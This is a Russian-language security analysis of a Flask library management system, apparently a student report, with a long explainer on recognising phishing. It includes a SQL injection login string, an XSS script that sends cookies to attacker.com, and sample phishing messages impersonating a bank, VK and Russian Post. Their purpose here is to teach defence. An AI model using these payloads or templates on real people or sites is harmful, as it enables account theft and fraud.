# Анализ безопасности АИС "Система управления библиотекой"

## 1. Защита информации и цели безопасности

### Ключевые цели безопасности

#### Конфиденциальность (Confidentiality)
- **Определение:** Обеспечение доступа к информации только авторизованным пользователям
- **В нашей системе:**
  - Персональные данные читателей (email, телефон, адрес) должны быть защищены
  - Доступ к административным функциям только для сотрудников библиотеки
  - История выдачи книг - конфиденциальная информация

#### Целостность (Integrity)
- **Определение:** Защита данных от несанкционированного изменения или удаления
- **В нашей системе:**
  - Записи о выдаче книг не должны изменяться задним числом
  - ISBN книг должны быть уникальными
  - Количество доступных книг должно соответствовать реальности

#### Доступность (Availability)
- **Определение:** Обеспечение бесперебойного доступа к системе для авторизованных пользователей
- **В нашей системе:**
  - Система должна быть доступна в рабочие часы библиотеки
  - Резервное копирование для восстановления после сбоев
  - Защита от DoS-атак

## 2. Методы обеспечения безопасности ПО

### 2.1 Контроль доступа

#### Аутентификация
- **Что это:** Проверка подлинности пользователя
- **Методы:**
  - Пароли (минимум 8 символов, буквы + цифры + спецсимволы)
  - Двухфакторная аутентификация (2FA)
  - Биометрия (отпечатки пальцев, распознавание лица)

#### Авторизация
- **Что это:** Определение прав доступа пользователя
- **Уровни доступа в библиотеке:**
  - **Администратор:** Полный доступ ко всем функциям
  - **Библиотекарь:** Выдача/возврат книг, управление читателями
  - **Читатель:** Просмотр каталога, своих выдач

### 2.2 Криптографическая защита

#### Шифрование данных
- **Хеширование паролей:** bcrypt, Argon2
- **Шифрование БД:** SQLCipher для SQLite
- **HTTPS:** Шифрование трафика между клиентом и сервером
- **Шифрование резервных копий**

### 2.3 Антивирусная защита

- Регулярное сканирование сервера
- Проверка загружаемых файлов
- Обновление антивирусных баз

### 2.4 Брандмауэры (Firewalls)

- **Сетевой firewall:** Контроль входящего/исходящего трафика
- **Web Application Firewall (WAF):** Защита от веб-атак
- **Правила:**
  - Разрешить только порты 80 (HTTP) и 443 (HTTPS)
  - Блокировать подозрительные IP-адреса
  - Ограничение частоты запросов (rate limiting)

### 2.5 Защита от модификации кода

- **Контрольные суммы:** Проверка целостности файлов
- **Цифровые подписи:** Подтверждение подлинности ПО
- **Защита от reverse engineering**

### 2.6 Аудит и журналирование

- **Логирование всех действий:**
  - Вход/выход пользователей
  - Изменения в базе данных
  - Попытки несанкционированного доступа
- **Анализ логов:** Выявление подозрительной активности
- **Хранение логов:** Минимум 6 месяцев

## 3. Основные угрозы безопасности

### 3.1 Несанкционированный доступ

#### Описание
Попытка получить доступ к системе без разрешения

#### Методы атаки:
- **Подбор паролей (Brute Force)**
  - Автоматический перебор комбинаций
  - Защита: Ограничение попыток входа, CAPTCHA
  
- **Кража учетных данных**
  - Фишинг, кейлоггеры, социальная инженерия
  - Защита: Обучение пользователей, 2FA

- **Эксплуатация уязвимостей**
  - Использование багов в коде
  - Защита: Регулярные обновления, патчи

#### В нашей системе:
- Риск: Доступ к персональным данным читателей
- Последствия: Утечка конфиденциальной информации
- Меры защиты: Хеширование паролей, сессии с таймаутом

### 3.2 SQL-инъекции

#### Описание
Внедрение вредоносного SQL-кода через поля ввода

#### Пример атаки:
```
Логин: admin' OR '1'='1
Пароль: anything
```

#### Защита в нашей системе:
```python
# НЕПРАВИЛЬНО (уязвимо):
query = f"SELECT * FROM users WHERE login='{login}'"

# ПРАВИЛЬНО (защищено):
cursor.execute("SELECT * FROM users WHERE login=?", (login,))
```

### 3.3 XSS (Cross-Site Scripting)

#### Описание
Внедрение JavaScript кода на страницу

#### Пример атаки:
```html
<script>
  // Кража cookies
  document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

#### Защита:
- Jinja2 автоматически экранирует HTML
- Content Security Policy (CSP)
- Валидация и санитизация ввода

### 3.4 CSRF (Cross-Site Request Forgery)

#### Описание
Выполнение нежелательных действий от имени пользователя

#### Защита:
- CSRF-токены в формах
- Проверка заголовка Referer
- SameSite cookies

### 3.5 Вредоносное ПО

#### Типы:
- **Вирусы:** Самокопирующиеся программы
- **Трояны:** Маскируются под легитимное ПО
- **Шифровальщики (Ransomware):** Шифруют данные и требуют выкуп
- **Шпионское ПО (Spyware):** Собирают информацию

#### Защита:
- Антивирус на сервере
- Регулярные обновления ОС
- Ограничение прав пользователей
- Резервное копирование

### 3.6 DoS/DDoS атаки

#### Описание
Перегрузка системы запросами для отказа в обслуживании

#### Защита:
- Rate limiting (ограничение частоты запросов)
- CDN (Content Delivery Network)
- Фильтрация трафика
- Масштабирование инфраструктуры

### 3.7 Утечка данных

#### Причины:
- **Инсайдеры:** Сотрудники с доступом к данным
- **Взлом:** Несанкционированный доступ
- **Ошибки конфигурации:** Открытые порты, слабые пароли

#### Защита:
- Шифрование данных
- Контроль доступа
- Мониторинг активности
- DLP (Data Loss Prevention) системы

## 4. Реализованные меры безопасности в нашей АИС

### 4.1 Защита от SQL-инъекций ✓
```python
# Все запросы используют параметризацию
cursor.execute('SELECT * FROM books WHERE title LIKE ?', (f'%{search}%',))
```

### 4.2 Защита от XSS ✓
```html
<!-- Jinja2 автоматически экранирует -->
{{ book.title }}  <!-- Безопасно -->
```

### 4.3 Валидация данных ✓
```python
# Проверка уникальности ISBN
try:
    cursor.execute('INSERT INTO books (...) VALUES (...)', data)
except sqlite3.IntegrityError:
    flash('Книга с таким ISBN уже существует!', 'error')
```

### 4.4 Безопасные сессии ✓
```python
app.secret_key = 'your-secret-key-here'  # В продакшене - случайный ключ
```

### 4.5 Ограничение доступа к файлам ✓
- База данных не доступна напрямую через веб
- Только Flask-приложение имеет доступ к БД

## 5. Рекомендации по улучшению безопасности

### Критичные (необходимо реализовать):

1. **Добавить систему аутентификации**
   - Регистрация и вход пользователей
   - Хеширование паролей (bcrypt)
   - Разграничение прав доступа

2. **Использовать HTTPS**
   - SSL/TLS сертификат
   - Шифрование трафика

3. **Добавить CSRF-защиту**
   - Flask-WTF с CSRF-токенами
   - Защита всех форм

4. **Регулярное резервное копирование**
   - Автоматический backup БД
   - Хранение в безопасном месте

### Желательные (повысят безопасность):

5. **Двухфакторная аутентификация (2FA)**
   - SMS-коды или приложения-аутентификаторы

6. **Логирование действий**
   - Запись всех операций в лог-файл
   - Мониторинг подозрительной активности

7. **Rate Limiting**
   - Ограничение количества запросов
   - Защита от brute force

8. **Обновления безопасности**
   - Регулярное обновление Flask и зависимостей
   - Мониторинг уязвимостей (CVE)

## 6. Что такое фишинг?

### Определение

**Фишинг (Phishing)** - это вид мошенничества, при котором злоумышленники пытаются обманом получить конфиденциальную информацию (пароли, данные банковских карт, личные данные) путем маскировки под доверенное лицо или организацию.

Название происходит от английского "fishing" (рыбалка) - злоумышленники "ловят" жертв на "наживку".

### Как работает фишинг?

1. **Создание поддельного сообщения**
   - Email, SMS, сообщение в соцсетях
   - Имитация официального письма от банка, компании, госоргана

2. **Создание чувства срочности**
   - "Ваш аккаунт заблокирован!"
   - "Подтвердите данные в течение 24 часов!"
   - "Выиграли приз, заберите сейчас!"

3. **Переход по ссылке**
   - Ссылка ведет на поддельный сайт
   - Сайт выглядит как настоящий

4. **Ввод данных**
   - Жертва вводит логин, пароль, данные карты
   - Данные попадают к мошенникам

### Примеры фишинга

#### Пример 1: Фишинг от имени банка

**Email:**
```
От: security@sberbank-online.ru
Тема: СРОЧНО! Подозрительная активность

Уважаемый клиент!

Мы обнаружили подозрительную активность в вашем аккаунте.
Для защиты средств необходимо подтвердить личность.

Перейдите по ссылке: http://sberbank-verify.com/confirm

Если не подтвердите в течение 24 часов, счет будет заблокирован.

С уважением,
Служба безопасности Сбербанк
```

**Признаки фишинга:**
- ❌ Домен не настоящий (sberbank-verify.com вместо sberbank.ru)
- ❌ Создание паники и срочности
- ❌ Требование перейти по ссылке
- ❌ Банки никогда не просят пароли по email

#### Пример 2: Фишинг в социальных сетях

**Сообщение ВКонтакте:**
```
Привет! Это ты на фото? 😱
[ссылка на vk-photos.com]
```

**Что происходит:**
- Ссылка ведет на поддельную страницу входа ВК
- Пользователь вводит логин и пароль
- Мошенники получают доступ к аккаунту

#### Пример 3: Фишинг через SMS (Smishing)

**SMS:**
```
Ваша посылка ожидает получения.
Отследить: bit.ly/track12345
Почта России
```

**Что происходит:**
- Ссылка ведет на сайт с вирусом
- Или просит ввести данные карты для "оплаты хранения"

#### Пример 4: Фишинг от имени работодателя

**Email сотруднику:**
```
От: hr@company-portal.com
Тема: Обновление данных сотрудника

Здравствуйте!

Просим обновить ваши данные в системе.
Войдите в личный кабинет: [ссылка]

Логин: ваш email
Пароль: ваш текущий пароль

HR-отдел
```

**Цель:** Получить корпоративные учетные данные

### Виды фишинга

1. **Email Phishing** - через электронную почту
2. **Spear Phishing** - целенаправленная атака на конкретного человека
3. **Whaling** - атака на топ-менеджеров компании
4. **Smishing** - через SMS
5. **Vishing** - голосовой фишинг (звонки)
6. **Clone Phishing** - копирование легитимных писем с заменой ссылок

### Как распознать фишинг?

#### Признаки фишингового письма:

✓ **Проверьте отправителя**
- Настоящий: support@sberbank.ru
- Фишинг: support@sberbank-online.com

✓ **Ошибки в тексте**
- Грамматические ошибки
- Странные формулировки

✓ **Срочность и угрозы**
- "Немедленно подтвердите!"
- "Счет будет заблокирован!"

✓ **Подозрительные ссылки**
- Наведите курсор - увидите реальный адрес
- Короткие ссылки (bit.ly) - подозрительны

✓ **Запрос конфиденциальных данных**
- Банки НИКОГДА не просят пароли
- Не просят данные карты по email

✓ **Вложения**
- Неожиданные файлы .exe, .zip
- "Счет.pdf.exe" - вирус!

### Как защититься от фишинга?

#### Для пользователей:

1. **Не переходите по подозрительным ссылкам**
   - Вводите адрес сайта вручную
   - Используйте закладки браузера

2. **Проверяйте адрес сайта**
   - Должен начинаться с https://
   - Проверьте наличие замка в адресной строке

3. **Используйте двухфакторную аутентификацию**
   - Даже если украдут пароль, не смогут войти

4. **Не сообщайте пароли**
   - Никому и никогда
   - Даже "службе поддержки"

5. **Обновляйте ПО**
   - Браузер, антивирус, ОС
   - Закрывайте уязвимости

6. **Используйте антивирус**
   - С защитой от фишинга
   - Регулярно сканируйте систему

7. **Будьте внимательны**
   - Если что-то кажется подозрительным - оно подозрительное
   - Лучше перепроверить, чем потерять деньги

#### Для организаций:

1. **Обучение сотрудников**
   - Регулярные тренинги по безопасности
   - Симуляция фишинговых атак

2. **Email-фильтры**
   - Блокировка подозрительных писем
   - SPF, DKIM, DMARC

3. **Многофакторная аутентификация**
   - Обязательна для всех сотрудников

4. **Политика безопасности**
   - Четкие правила работы с email
   - Процедура сообщения о фишинге

### Что делать, если попались на фишинг?

1. **Немедленно смените пароли**
   - На всех сайтах, где использовали этот пароль

2. **Свяжитесь с банком**
   - Если вводили данные карты
   - Заблокируйте карту

3. **Проверьте компьютер антивирусом**
   - Полное сканирование системы

4. **Сообщите в организацию**
   - Если фишинг от имени компании
   - Помогите предупредить других

5. **Обратитесь в полицию**
   - При финансовых потерях
   - Сохраните все доказательства

## Заключение

Безопасность АИС - это комплексный подход, включающий:
- Технические меры защиты
- Обучение пользователей
- Регулярный мониторинг
- Быстрое реагирование на инциденты

Фишинг остается одной из самых распространенных угроз, так как эксплуатирует человеческий фактор. Лучшая защита - это бдительность и знание признаков мошенничества.

**Помните:** Ни одна организация не попросит вас сообщить пароль или данные карты по email, SMS или телефону!
